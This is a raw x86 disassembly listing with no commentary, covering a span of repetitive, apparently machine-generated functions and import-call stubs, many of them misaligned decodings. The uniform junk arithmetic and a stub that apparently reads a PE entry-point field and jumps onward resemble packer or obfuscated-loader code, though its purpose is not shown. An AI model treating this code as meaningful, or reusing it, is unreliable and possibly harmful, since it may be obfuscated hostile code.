  4d0793:	add    esp,0x8
  4d0796:	pop    esi
  4d0797:	push   0x0
  4d0799:	call   0x4d0b54
  4d079e:	add    esp,0x4
  4d07a1:	mov    edx,0x4d2018
  4d07a6:	mov    edx,DWORD PTR [edx]
  4d07a8:	push   edx
  4d07a9:	push   DWORD PTR [esi-0xb8]
  4d07af:	pop    edx
  4d07b0:	call   edx
  4d07b2:	add    esp,0x40
  4d07b5:	pop    ebp
  4d07b6:	ret    
  4d07b7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07bd:	sub    esp,0x40
  4d07c0:	lea    esi,ds:0x4d3104
  4d07c6:	sbb    DWORD PTR [ebp-0x14],0x77
  4d07ca:	push   esi
  4d07cb:	push   DWORD PTR [esi+0xd8]
  4d07d1:	push   DWORD PTR [esi+0x1e0]
  4d07d7:	push   DWORD PTR [esi+0x28]
  4d07da:	call   0x4d09c4
  4d07df:	add    esp,0xc
  4d07e2:	pop    esi
  4d07e3:	push   0x0
  4d07e5:	call   0x4d0d1c
  4d07ea:	add    esp,0x4
  4d07ed:	push   0x0
  4d07ef:	call   0x4d0870
  4d07f4:	add    esp,0x4
  4d07f7:	add    esp,0x40
  4d07fa:	pop    ebp
  4d07fb:	ret    
  4d07fc:	mov    edi,edi
  4d07fe:	push   ebp
  4d07ff:	mov    ebp,esp
  4d0801:	sub    esp,0x3c
  4d0804:	lea    edx,[edi+0xbc]
  4d080a:	sub    DWORD PTR [edx-0x74],0x2
  4d080e:	push   edx
  4d080f:	push   DWORD PTR [edx+0x108]
  4d0815:	push   esi
  4d0816:	push   edi
  4d0817:	call   0x4d087c
  4d081c:	add    esp,0xc
  4d081f:	pop    edx
  4d0820:	push   edx
  4d0821:	mov    esi,0x0
  4d0826:	push   esi
  4d0827:	call   0x4d1018
  4d082c:	add    esp,0x4
  4d082f:	pop    edx
  4d0830:	push   edx
  4d0831:	call   0x4d1248
  4d0836:	add    esp,0x4
  4d0839:	pop    edx
  4d083a:	add    esp,0x3c
  4d083d:	pop    ebp
  4d083e:	ret    
  4d083f:	add    BYTE PTR [edi-0x1],bl
  4d0842:	adc    eax,0x4d205c
  4d0847:	call   edi
  4d0849:	add    BYTE PTR [eax],al
  4d084b:	add    BYTE PTR [edi-0x1],bl
  4d084e:	adc    eax,0x4d2070
  4d0853:	call   edi
  4d0855:	add    BYTE PTR [eax],al
  4d0857:	add    BYTE PTR [edi-0x1],bl
  4d085a:	adc    eax,0x4d2018
  4d085f:	call   edi
  4d0861:	add    BYTE PTR [eax],al
  4d0863:	add    BYTE PTR [edi-0x1],bl
  4d0866:	adc    eax,0x4d209c
  4d086b:	call   edi
  4d086d:	add    BYTE PTR [eax],al
  4d086f:	add    BYTE PTR [edi-0x1],bl
  4d0872:	adc    eax,0x4d2024
  4d0877:	call   edi
  4d0879:	add    BYTE PTR [eax],al
  4d087b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0881:	sub    esp,0x34
  4d0884:	lea    edi,ds:0x4d3180
  4d088a:	and    eax,0x679c
  4d088f:	push   edi
  4d0890:	mov    ebx,0x0
  4d0895:	push   ebx
  4d0896:	call   0x4d153c
  4d089b:	add    esp,0x4
  4d089e:	pop    edi
  4d089f:	push   edi
  4d08a0:	push   DWORD PTR [edi+0x198]
  4d08a6:	push   DWORD PTR [edi+0x1bc]
  4d08ac:	push   DWORD PTR [edi+0x58]
  4d08af:	push   DWORD PTR [edi+0x150]
  4d08b5:	call   0x4d0eac
  4d08ba:	add    esp,0x10
  4d08bd:	pop    edi
  4d08be:	push   edi
  4d08bf:	mov    edi,0x0
  4d08c4:	push   edi
  4d08c5:	call   0x4d1000
  4d08ca:	add    esp,0x4
  4d08cd:	pop    edi
  4d08ce:	add    esp,0x34
  4d08d1:	pop    ebp
  4d08d2:	ret    
  4d08d3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08d9:	sub    esp,0x48
  4d08dc:	lea    ecx,[eax+0xe8]
  4d08e2:	xor    esi,0x30
  4d08e5:	push   ecx
  4d08e6:	mov    ecx,0x0
  4d08eb:	push   ecx
  4d08ec:	call   0x4d1018
  4d08f1:	add    esp,0x4
  4d08f4:	pop    ecx
  4d08f5:	push   ecx
  4d08f6:	push   DWORD PTR [ecx+0x14c]
  4d08fc:	push   DWORD PTR [ecx+0x1e0]
  4d0902:	call   0x4d0f60
  4d0907:	add    esp,0x8
  4d090a:	pop    ecx
  4d090b:	push   ecx
  4d090c:	push   0x0
  4d090e:	call   0x4d0d1c
  4d0913:	add    esp,0x4
  4d0916:	pop    ecx
  4d0917:	add    esp,0x48
  4d091a:	pop    ebp
  4d091b:	ret    
  4d091c:	pop    edi
  4d091d:	call   DWORD PTR ds:0x4d208c
  4d0923:	call   edi
  4d0925:	add    BYTE PTR [eax],al
  4d0927:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d092d:	sub    esp,0x60
  4d0930:	mov    edi,0x4d300c
  4d0935:	add    DWORD PTR [ebp-0x38],edi
  4d0938:	push   edi
  4d0939:	mov    edx,0x0
  4d093e:	push   edx
  4d093f:	call   0x4d0d1c
  4d0944:	add    esp,0x4
  4d0947:	pop    edi
  4d0948:	push   edi
  4d0949:	push   DWORD PTR [edi+0xe0]
  4d094f:	push   DWORD PTR [edi+0x18]
  4d0952:	call   0x4d0cd4
  4d0957:	add    esp,0x8
  4d095a:	pop    edi
  4d095b:	push   edi
  4d095c:	push   0x0
  4d095e:	call   0x4d1530
  4d0963:	add    esp,0x4
  4d0966:	pop    edi
  4d0967:	add    esp,0x60
  4d096a:	pop    ebp
  4d096b:	ret    
  4d096c:	pop    edi
  4d096d:	call   DWORD PTR ds:0x4d207c
  4d0973:	call   edi
  4d0975:	add    BYTE PTR [eax],al
  4d0977:	add    BYTE PTR [edi-0x1],bl
  4d097a:	adc    eax,0x4d2010
  4d097f:	call   edi
  4d0981:	add    BYTE PTR [eax],al
  4d0983:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0989:	sub    esp,0x54
  4d098c:	lea    ebx,[eax-0x38]
  4d098f:	adc    DWORD PTR [ebx+0x9c],0xffffffcc
  4d0996:	push   0x0
  4d0998:	call   0x4d153c
  4d099d:	add    esp,0x4
  4d09a0:	push   ebx
  4d09a1:	push   eax
  4d09a2:	push   DWORD PTR [ebx+0x108]
  4d09a8:	push   eax
  4d09a9:	push   edi
  4d09aa:	call   0x4d10c0
  4d09af:	add    esp,0x10
  4d09b2:	pop    ebx
  4d09b3:	push   0x0
  4d09b5:	call   0x4d0d1c
  4d09ba:	add    esp,0x4
  4d09bd:	add    esp,0x54
  4d09c0:	pop    ebp
  4d09c1:	ret    
  4d09c2:	add    BYTE PTR [eax],al
  4d09c4:	mov    edi,edi
  4d09c6:	push   ebp
  4d09c7:	mov    ebp,esp
  4d09c9:	sub    esp,0x20
  4d09cc:	mov    eax,0x4d3104
  4d09d1:	mov    edi,DWORD PTR [eax+0x7c]
  4d09d4:	push   eax
  4d09d5:	mov    edi,0x0
  4d09da:	push   edi
  4d09db:	call   0x4d0870
  4d09e0:	add    esp,0x4
  4d09e3:	pop    eax
  4d09e4:	push   eax
  4d09e5:	push   edx
  4d09e6:	push   esi
  4d09e7:	push   esi
  4d09e8:	call   0x4d08d4
  4d09ed:	add    esp,0xc
  4d09f0:	pop    eax
  4d09f1:	push   eax
  4d09f2:	push   0x0
  4d09f4:	call   0x4d1498
  4d09f9:	add    esp,0x4
  4d09fc:	pop    eax
  4d09fd:	add    esp,0x20
  4d0a00:	pop    ebp
  4d0a01:	ret    
  4d0a02:	add    BYTE PTR [eax],al
  4d0a04:	pop    edi
  4d0a05:	call   DWORD PTR ds:0x4d2084
  4d0a0b:	call   edi
  4d0a0d:	add    BYTE PTR [eax],al
  4d0a0f:	add    BYTE PTR [edi-0x1],bl
  4d0a12:	adc    eax,0x4d2094
  4d0a17:	call   edi
  4d0a19:	add    BYTE PTR [eax],al
  4d0a1b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a21:	sub    esp,0x20
  4d0a24:	mov    ebx,0x4d307c
  4d0a29:	sbb    DWORD PTR [ebp-0x8],esi
  4d0a2c:	push   ebx
  4d0a2d:	push   DWORD PTR [ebx+0x174]
  4d0a33:	push   esi
  4d0a34:	push   edx
  4d0a35:	call   0x4d0e24
  4d0a3a:	add    esp,0xc
  4d0a3d:	pop    ebx
  4d0a3e:	call   0x4d10b4
  4d0a43:	add    esp,0x4
  4d0a46:	mov    ecx,0x0
  4d0a4b:	push   ecx
  4d0a4c:	call   0x4d153c
  4d0a51:	add    esp,0x4
  4d0a54:	add    esp,0x20
  4d0a57:	pop    ebp
  4d0a58:	ret    
  4d0a59:	add    BYTE PTR [eax],al
  4d0a5b:	add    BYTE PTR [edi-0x1],bl
  4d0a5e:	adc    eax,0x4d2044
  4d0a63:	call   edi
  4d0a65:	add    BYTE PTR [eax],al
  4d0a67:	add    BYTE PTR [edi-0x1],bl
  4d0a6a:	adc    eax,0x4d2058
  4d0a6f:	call   edi
  4d0a71:	add    BYTE PTR [eax],al
  4d0a73:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a79:	sub    esp,0x54
  4d0a7c:	lea    esi,[ecx-0x9c]
  4d0a82:	sbb    DWORD PTR [esi-0x8],esi
  4d0a85:	push   esi
  4d0a86:	push   DWORD PTR [esi+0x8]
  4d0a89:	push   DWORD PTR [esi+0x78]
  4d0a8c:	push   DWORD PTR [esi+0x94]
  4d0a92:	push   DWORD PTR [esi+0x88]
  4d0a98:	call   0x4d1104
  4d0a9d:	add    esp,0x10
  4d0aa0:	pop    esi
  4d0aa1:	mov    eax,0x0
  4d0aa6:	push   eax
  4d0aa7:	call   0x4d1498
  4d0aac:	add    esp,0x4
  4d0aaf:	push   0x0
  4d0ab1:	call   0x4d1018
  4d0ab6:	add    esp,0x4
  4d0ab9:	add    esp,0x54
  4d0abc:	pop    ebp
  4d0abd:	ret    
  4d0abe:	add    BYTE PTR [eax],al
  4d0ac0:	pop    edi
  4d0ac1:	call   DWORD PTR ds:0x4d2008
  4d0ac7:	call   edi
  4d0ac9:	add    BYTE PTR [eax],al
  4d0acb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ad1:	sub    esp,0x50
  4d0ad4:	lea    eax,ds:0x4d307c
  4d0ada:	sbb    edi,DWORD PTR [eax+0x5c]
  4d0add:	push   eax
  4d0ade:	push   esi
  4d0adf:	push   edx
  4d0ae0:	push   DWORD PTR [eax+0x48]
  4d0ae3:	call   0x4d1074
  4d0ae8:	add    esp,0xc
  4d0aeb:	pop    eax
  4d0aec:	push   eax
  4d0aed:	lea    esi,[eax-0x7c]
  4d0af0:	push   esi
  4d0af1:	call   0x4d0858
  4d0af6:	add    esp,0x4
  4d0af9:	test   eax,eax
  4d0afb:	jne    0x4d0aed
  4d0afd:	pop    eax
  4d0afe:	push   eax
  4d0aff:	push   0x0
  4d0b01:	call   0x4d12f0
  4d0b06:	add    esp,0x4
  4d0b09:	pop    eax
  4d0b0a:	add    esp,0x50
  4d0b0d:	pop    ebp
  4d0b0e:	ret    
  4d0b0f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b15:	sub    esp,0x5c
  4d0b18:	mov    edi,0x4d3014
  4d0b1d:	cmp    edi,0x5997
  4d0b23:	je     0x4d0b13
  4d0b25:	push   edi
  4d0b26:	call   0x4d10b4
  4d0b2b:	add    esp,0x4
  4d0b2e:	pop    edi
  4d0b2f:	push   edi
  4d0b30:	push   ecx
  4d0b31:	push   DWORD PTR [edi+0x1f4]
  4d0b37:	push   ecx
  4d0b38:	call   0x4d0c40
  4d0b3d:	add    esp,0xc
  4d0b40:	pop    edi
  4d0b41:	push   edi
  4d0b42:	push   0x0
  4d0b44:	call   0x4d0d1c
  4d0b49:	add    esp,0x4
  4d0b4c:	pop    edi
  4d0b4d:	add    esp,0x5c
  4d0b50:	pop    ebp
  4d0b51:	ret    
  4d0b52:	add    BYTE PTR [eax],al
  4d0b54:	pop    edi
  4d0b55:	call   DWORD PTR ds:0x4d2034
  4d0b5b:	call   edi
  4d0b5d:	add    BYTE PTR [eax],al
  4d0b5f:	add    BYTE PTR [edi-0x1],bl
  4d0b62:	adc    eax,0x4d20a0
  4d0b67:	call   edi
  4d0b69:	add    BYTE PTR [eax],al
  4d0b6b:	add    BYTE PTR [edi-0x1],bl
  4d0b6e:	adc    eax,0x4d2004
  4d0b73:	call   edi
  4d0b75:	add    BYTE PTR [eax],al
  4d0b77:	add    BYTE PTR [edi+0x2b],dl
  4d0b7a:	call   DWORD PTR [edi+0x57]
  4d0b7d:	push   edi
  4d0b7e:	push   edi
  4d0b7f:	call   0x4d1248
  4d0b84:	sub    esp,0xfffffffc
  4d0b87:	call   0x4d0a5c
  4d0b8c:	push   0x2
  4d0b8e:	xor    eax,eax
  4d0b90:	adc    eax,0x4d3030
  4d0b95:	push   0x0
  4d0b97:	xor    ecx,ecx
  4d0b99:	adc    ecx,0x4d3036
  4d0b9f:	add    BYTE PTR [ecx],0x41
  4d0ba2:	push   eax
  4d0ba3:	call   0x4d0dd4
  4d0ba8:	pop    edi
  4d0ba9:	pop    edi
  4d0baa:	pop    edi
  4d0bab:	lea    edi,[eax+0x3b]
  4d0bae:	mov    edi,DWORD PTR [edi]
  4d0bb0:	lea    eax,[eax+edi*1]
  4d0bb3:	mov    eax,DWORD PTR [eax+0x28]
  4d0bb6:	pusha  
  4d0bb7:	mov    ah,0x45
  4d0bb9:	sub    al,ah
  4d0bbb:	ja     0x4d076c
  4d0bc1:	popa   
  4d0bc2:	ret    
  4d0bc3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bc9:	sub    esp,0x58
  4d0bcc:	lea    esi,ds:0x4d30c8
  4d0bd2:	add    ecx,DWORD PTR [esi-0x58]
  4d0bd5:	push   0x0
  4d0bd7:	call   0x4d1000
  4d0bdc:	add    esp,0x4
  4d0bdf:	push   esi
  4d0be0:	push   DWORD PTR [esi+0x84]
  4d0be6:	push   ecx
  4d0be7:	call   0x4d1548
  4d0bec:	add    esp,0x8
  4d0bef:	pop    esi
  4d0bf0:	call   0x4d1248
  4d0bf5:	add    esp,0x4
  4d0bf8:	add    esp,0x58
  4d0bfb:	pop    ebp
  4d0bfc:	ret    
  4d0bfd:	add    BYTE PTR [eax],al
  4d0bff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c05:	sub    esp,0x20
  4d0c08:	mov    edi,0x4d3028
  4d0c0d:	sbb    DWORD PTR [ebp-0x20],0x18e6
  4d0c14:	push   edi
  4d0c15:	push   0x0
  4d0c17:	call   0x4d1498
  4d0c1c:	add    esp,0x4
  4d0c1f:	pop    edi
  4d0c20:	push   edi
  4d0c21:	push   DWORD PTR [edi+0xc0]
  4d0c27:	push   ebx
  4d0c28:	call   0x4d0bc4
  4d0c2d:	add    esp,0x8
  4d0c30:	pop    edi
  4d0c31:	push   edi
  4d0c32:	call   0x4d1024
  4d0c37:	add    esp,0x4
  4d0c3a:	pop    edi
  4d0c3b:	add    esp,0x20
  4d0c3e:	pop    ebp
  4d0c3f:	ret    
  4d0c40:	mov    edi,edi
  4d0c42:	push   ebp
  4d0c43:	mov    ebp,esp
  4d0c45:	sub    esp,0x24
  4d0c48:	mov    esi,0x4d30f0
  4d0c4d:	add    DWORD PTR [esi+0xd0],esi
  4d0c53:	push   esi
  4d0c54:	push   ecx
  4d0c55:	push   DWORD PTR [esi+0x48]
  4d0c58:	push   DWORD PTR [esi+0x120]
  4d0c5e:	push   ecx
  4d0c5f:	call   0x4d0de0
  4d0c64:	add    esp,0x10
  4d0c67:	pop    esi
  4d0c68:	mov    eax,0xfffffff4
  4d0c6d:	push   eax
  4d0c6e:	call   0x4d0b6c
  4d0c73:	add    esp,0x4
  4d0c76:	mov    ecx,0x0
  4d0c7b:	push   ecx
  4d0c7c:	call   0x4d0b54
  4d0c81:	add    esp,0x4
  4d0c84:	add    esp,0x24
  4d0c87:	pop    ebp
  4d0c88:	ret    
  4d0c89:	add    BYTE PTR [eax],al
  4d0c8b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c91:	sub    esp,0x20
  4d0c94:	lea    ebx,ds:0x4d3134
  4d0c9a:	mov    DWORD PTR [ebx+0x8c],0xffffffc5
  4d0ca4:	push   ebx
  4d0ca5:	push   ecx
  4d0ca6:	push   DWORD PTR [ebx+0x88]
  4d0cac:	push   DWORD PTR [ebx+0xb8]
  4d0cb2:	push   esi
  4d0cb3:	call   0x4d1438
  4d0cb8:	add    esp,0x10
  4d0cbb:	pop    ebx
  4d0cbc:	call   0x4d1024
  4d0cc1:	add    esp,0x4
  4d0cc4:	call   0x4d1024
  4d0cc9:	add    esp,0x4
  4d0ccc:	add    esp,0x20
  4d0ccf:	pop    ebp
  4d0cd0:	ret    
  4d0cd1:	add    BYTE PTR [eax],al
  4d0cd3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cd9:	sub    esp,0x1c
  4d0cdc:	mov    ecx,0x4d314c
  4d0ce1:	adc    edx,ecx
  4d0ce3:	push   ecx
  4d0ce4:	push   DWORD PTR [ecx+0x184]
  4d0cea:	push   DWORD PTR [ecx+0x16c]
  4d0cf0:	push   DWORD PTR [ecx+0x18]
  4d0cf3:	push   ebx
  4d0cf4:	call   0x4d0728
  4d0cf9:	add    esp,0x10
  4d0cfc:	pop    ecx
  4d0cfd:	push   ecx
  4d0cfe:	push   0x0
  4d0d00:	call   0x4d12f0
  4d0d05:	add    esp,0x4
  4d0d08:	pop    ecx
  4d0d09:	push   ecx
  4d0d0a:	push   0x0
  4d0d0c:	call   0x4d153c
  4d0d11:	add    esp,0x4
  4d0d14:	pop    ecx
  4d0d15:	add    esp,0x1c
  4d0d18:	pop    ebp
  4d0d19:	ret    
  4d0d1a:	add    BYTE PTR [eax],al
  4d0d1c:	pop    edi
  4d0d1d:	call   DWORD PTR ds:0x4d201c
  4d0d23:	call   edi
  4d0d25:	add    BYTE PTR [eax],al
  4d0d27:	add    BYTE PTR [edi-0x1],bl
  4d0d2a:	adc    eax,0x4d2048
  4d0d2f:	call   edi
  4d0d31:	add    BYTE PTR [eax],al
  4d0d33:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d39:	sub    esp,0x4c
  4d0d3c:	lea    ebx,[esi-0x114]
  4d0d42:	and    edx,eax
  4d0d44:	mov    esi,0x0
  4d0d49:	push   esi
  4d0d4a:	call   0x4d1018
  4d0d4f:	add    esp,0x4
  4d0d52:	push   ebx
  4d0d53:	push   DWORD PTR [ebx+0xc4]
  4d0d59:	push   DWORD PTR [ebx+0x1c4]
  4d0d5f:	push   DWORD PTR [ebx+0xc0]
  4d0d65:	call   0x4d0f08
  4d0d6a:	add    esp,0xc
  4d0d6d:	pop    ebx
  4d0d6e:	push   0x0
  4d0d70:	call   0x4d1498
  4d0d75:	add    esp,0x4
  4d0d78:	add    esp,0x4c
  4d0d7b:	pop    ebp
  4d0d7c:	ret    
  4d0d7d:	add    BYTE PTR [eax],al
  4d0d7f:	add    BYTE PTR [edi-0x1],bl
  4d0d82:	adc    eax,0x4d2064
  4d0d87:	call   edi
  4d0d89:	add    BYTE PTR [eax],al
  4d0d8b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d91:	sub    esp,0x4c
  4d0d94:	lea    ecx,[edi-0xc]
  4d0d97:	mov    DWORD PTR [ebp-0x2c],esi
  4d0d9a:	push   ecx
  4d0d9b:	push   0x0
  4d0d9d:	call   0x4d0d1c
  4d0da2:	add    esp,0x4
  4d0da5:	pop    ecx
  4d0da6:	push   ecx
  4d0da7:	push   eax
  4d0da8:	push   DWORD PTR [ecx+0x164]
  4d0dae:	call   0x4d139c
  4d0db3:	add    esp,0x8
  4d0db6:	pop    ecx
  4d0db7:	push   ecx
  4d0db8:	lea    edx,[ecx-0x90]
  4d0dbe:	push   edx
  4d0dbf:	call   0x4d0858
  4d0dc4:	add    esp,0x4
  4d0dc7:	test   eax,eax
  4d0dc9:	jne    0x4d0db8
  4d0dcb:	pop    ecx
  4d0dcc:	add    esp,0x4c
  4d0dcf:	pop    ebp
  4d0dd0:	ret    
  4d0dd1:	add    BYTE PTR [eax],al
  4d0dd3:	add    BYTE PTR [edi-0x1],bl
  4d0dd6:	adc    eax,0x4d200c
  4d0ddb:	call   edi
  4d0ddd:	add    BYTE PTR [eax],al
  4d0ddf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0de5:	sub    esp,0x2c
  4d0de8:	lea    ebx,[esi+0xb8]
  4d0dee:	or     edi,DWORD PTR [ebx-0x12c]
  4d0df4:	push   ebx
  4d0df5:	push   DWORD PTR [ebx+0x128]
  4d0dfb:	push   DWORD PTR [ebx+0xd4]
  4d0e01:	push   ecx
  4d0e02:	call   0x4d0e6c
  4d0e07:	add    esp,0xc
  4d0e0a:	pop    ebx
  4d0e0b:	push   0x0
  4d0e0d:	call   0x4d1018
  4d0e12:	add    esp,0x4
  4d0e15:	call   0x4d1248
  4d0e1a:	add    esp,0x4
  4d0e1d:	add    esp,0x2c
  4d0e20:	pop    ebp
  4d0e21:	ret    
  4d0e22:	add    BYTE PTR [eax],al
  4d0e24:	mov    edi,edi
  4d0e26:	push   ebp
  4d0e27:	mov    ebp,esp
  4d0e29:	sub    esp,0x44
  4d0e2c:	lea    esi,ds:0x4d318c
  4d0e32:	sub    DWORD PTR [ebp-0x20],esi
  4d0e35:	push   0x0
  4d0e37:	call   0x4d12f0
  4d0e3c:	add    esp,0x4
  4d0e3f:	push   esi
  4d0e40:	push   edx
  4d0e41:	push   edi
  4d0e42:	push   DWORD PTR [esi+0x1a8]
  4d0e48:	call   0x4d0d34
  4d0e4d:	add    esp,0xc
  4d0e50:	pop    esi
  4d0e51:	lea    ecx,[esi-0x18c]
  4d0e57:	push   ecx
  4d0e58:	call   0x4d0858
  4d0e5d:	add    esp,0x4
  4d0e60:	test   eax,eax
  4d0e62:	jne    0x4d0e52
  4d0e64:	add    esp,0x44
  4d0e67:	pop    ebp
  4d0e68:	ret    
  4d0e69:	add    BYTE PTR [eax],al
  4d0e6b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e71:	sub    esp,0x44
  4d0e74:	lea    eax,ds:0x4d301c
  4d0e7a:	adc    esi,DWORD PTR [ebp-0x24]
  4d0e7d:	push   eax
  4d0e7e:	mov    edi,0x0
  4d0e83:	push   edi
  4d0e84:	call   0x4d0870
  4d0e89:	add    esp,0x4
  4d0e8c:	pop    eax
  4d0e8d:	push   eax
  4d0e8e:	push   ecx
  4d0e8f:	push   DWORD PTR [eax]
  4d0e91:	call   0x4d06ec
  4d0e96:	add    esp,0x8
  4d0e99:	pop    eax
  4d0e9a:	push   eax
  4d0e9b:	push   0x0
  4d0e9d:	call   0x4d0b54
  4d0ea2:	add    esp,0x4
  4d0ea5:	pop    eax
  4d0ea6:	add    esp,0x44
  4d0ea9:	pop    ebp
  4d0eaa:	ret    
  4d0eab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0eb1:	sub    esp,0x58
  4d0eb4:	lea    ecx,ds:0x4d3018
  4d0eba:	add    DWORD PTR [ecx+0x198],eax
  4d0ec0:	push   ecx
  4d0ec1:	push   DWORD PTR [ecx+0x108]
  4d0ec7:	push   ebx
  4d0ec8:	push   DWORD PTR [ecx+0x134]
  4d0ece:	push   edx
  4d0ecf:	call   0x4d0a1c
  4d0ed4:	add    esp,0x10
  4d0ed7:	pop    ecx
  4d0ed8:	push   ecx
  4d0ed9:	lea    ebx,[ecx-0x18]
  4d0edc:	push   ebx
  4d0edd:	call   0x4d0858
  4d0ee2:	add    esp,0x4
  4d0ee5:	test   eax,eax
  4d0ee7:	jne    0x4d0ed9
  4d0ee9:	pop    ecx
  4d0eea:	push   ecx
  4d0eeb:	push   0xfffffff4
  4d0eed:	call   0x4d0b6c
  4d0ef2:	add    esp,0x4
  4d0ef5:	pop    ecx
  4d0ef6:	add    esp,0x58
  4d0ef9:	pop    ebp
  4d0efa:	ret    
  4d0efb:	add    BYTE PTR [edi-0x1],bl
  4d0efe:	adc    eax,0x4d2098
  4d0f03:	call   edi
  4d0f05:	add    BYTE PTR [eax],al
  4d0f07:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f0d:	sub    esp,0x44
  4d0f10:	lea    edi,[ebx+0x24]
  4d0f13:	add    DWORD PTR [ebp-0x8],ebx
  4d0f16:	push   edi
  4d0f17:	push   0xfffffff4
  4d0f19:	call   0x4d0b6c
  4d0f1e:	add    esp,0x4
  4d0f21:	pop    edi
  4d0f22:	push   edi
  4d0f23:	push   esi
  4d0f24:	push   esi
  4d0f25:	push   ecx
  4d0f26:	push   DWORD PTR [edi+0x30]
  4d0f29:	call   0x4d0d8c
  4d0f2e:	add    esp,0x10
  4d0f31:	pop    edi
  4d0f32:	push   edi
  4d0f33:	mov    ebx,0x0
  4d0f38:	push   ebx
  4d0f39:	call   0x4d12f0
  4d0f3e:	add    esp,0x4
  4d0f41:	pop    edi
  4d0f42:	add    esp,0x44
  4d0f45:	pop    ebp
  4d0f46:	ret    
  4d0f47:	add    BYTE PTR [edi-0x1],bl
  4d0f4a:	adc    eax,0x4d2088
  4d0f4f:	call   edi
  4d0f51:	add    BYTE PTR [eax],al
  4d0f53:	add    BYTE PTR [edi-0x1],bl
  4d0f56:	adc    eax,0x4d203c
  4d0f5b:	call   edi
  4d0f5d:	add    BYTE PTR [eax],al
  4d0f5f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f65:	sub    esp,0x44
  4d0f68:	lea    edi,ds:0x4d30c4
  4d0f6e:	sub    DWORD PTR [edi+0xb8],0xffff8493
  4d0f78:	push   edi
  4d0f79:	push   esi
  4d0f7a:	push   DWORD PTR [edi+0x1c0]
  4d0f80:	push   edx
  4d0f81:	call   0x4d11cc
  4d0f86:	add    esp,0xc
  4d0f89:	pop    edi
  4d0f8a:	push   edi
  4d0f8b:	call   0x4d10b4
  4d0f90:	add    esp,0x4
  4d0f93:	pop    edi
  4d0f94:	push   edi
  4d0f95:	mov    eax,0x0
  4d0f9a:	push   eax
  4d0f9b:	call   0x4d153c
  4d0fa0:	add    esp,0x4
  4d0fa3:	pop    edi
  4d0fa4:	add    esp,0x44
  4d0fa7:	pop    ebp
  4d0fa8:	ret    
  4d0fa9:	add    BYTE PTR [eax],al
  4d0fab:	add    BYTE PTR [edi-0x1],bl
  4d0fae:	adc    eax,0x4d2090
  4d0fb3:	call   edi
  4d0fb5:	add    BYTE PTR [eax],al
  4d0fb7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fbd:	sub    esp,0x4c
  4d0fc0:	mov    esi,0x4d31bc
  4d0fc5:	adc    edx,eax
  4d0fc7:	push   esi
  4d0fc8:	push   edx
  4d0fc9:	push   DWORD PTR [esi+0x18c]
  4d0fcf:	push   ecx
  4d0fd0:	push   DWORD PTR [esi+0x90]
  4d0fd6:	call   0x4d13e4
  4d0fdb:	add    esp,0x10
  4d0fde:	pop    esi
  4d0fdf:	mov    ebx,0x0
  4d0fe4:	push   ebx
  4d0fe5:	call   0x4d153c
  4d0fea:	add    esp,0x4
  4d0fed:	mov    ebx,0x0
  4d0ff2:	push   ebx
  4d0ff3:	call   0x4d153c
  4d0ff8:	add    esp,0x4
  4d0ffb:	add    esp,0x4c
  4d0ffe:	pop    ebp
  4d0fff:	ret    
  4d1000:	pop    edi
  4d1001:	call   DWORD PTR ds:0x4d2080
  4d1007:	call   edi
  4d1009:	add    BYTE PTR [eax],al
  4d100b:	add    BYTE PTR [edi-0x1],bl
  4d100e:	adc    eax,0x4d2030
  4d1013:	call   edi
  4d1015:	add    BYTE PTR [eax],al
  4d1017:	add    BYTE PTR [edi-0x1],bl
  4d101a:	adc    eax,0x4d206c
  4d101f:	call   edi
  4d1021:	add    BYTE PTR [eax],al
  4d1023:	add    BYTE PTR [edi-0x1],bl
  4d1026:	adc    eax,0x4d2038
  4d102b:	call   edi
  4d102d:	add    BYTE PTR [eax],al
  4d102f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1035:	sub    esp,0x38
  4d1038:	mov    eax,0x4d3044
  4d103d:	cmp    eax,0x5d4e
  4d1042:	jbe    0x4d1033
  4d1044:	push   eax
  4d1045:	push   ecx
  4d1046:	push   edx
  4d1047:	push   DWORD PTR [eax+0x80]
  4d104d:	call   0x4d0984
  4d1052:	add    esp,0xc
  4d1055:	pop    eax
  4d1056:	push   eax
  4d1057:	push   0x0
  4d1059:	call   0x4d0b54
  4d105e:	add    esp,0x4
  4d1061:	pop    eax
  4d1062:	push   eax
  4d1063:	push   0x0
  4d1065:	call   0x4d1530
  4d106a:	add    esp,0x4
  4d106d:	pop    eax
  4d106e:	add    esp,0x38
  4d1071:	pop    ebp
  4d1072:	ret    
  4d1073:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1079:	sub    esp,0x34
  4d107c:	lea    edi,ds:0x4d30a8
  4d1082:	sbb    DWORD PTR [ebp-0x28],ebx
  4d1085:	push   edi
  4d1086:	push   ecx
  4d1087:	push   eax
  4d1088:	push   DWORD PTR [edi+0x28]
  4d108b:	push   esi
  4d108c:	call   0x4d135c
  4d1091:	add    esp,0x10
  4d1094:	pop    edi
  4d1095:	push   edi
  4d1096:	call   0x4d1024
  4d109b:	add    esp,0x4
  4d109e:	pop    edi
  4d109f:	push   edi
  4d10a0:	mov    ecx,0x0
  4d10a5:	push   ecx
  4d10a6:	call   0x4d1018
  4d10ab:	add    esp,0x4
  4d10ae:	pop    edi
  4d10af:	add    esp,0x34
  4d10b2:	pop    ebp
  4d10b3:	ret    
  4d10b4:	pop    edi
  4d10b5:	call   DWORD PTR ds:0x4d2040
  4d10bb:	call   edi
  4d10bd:	add    BYTE PTR [eax],al
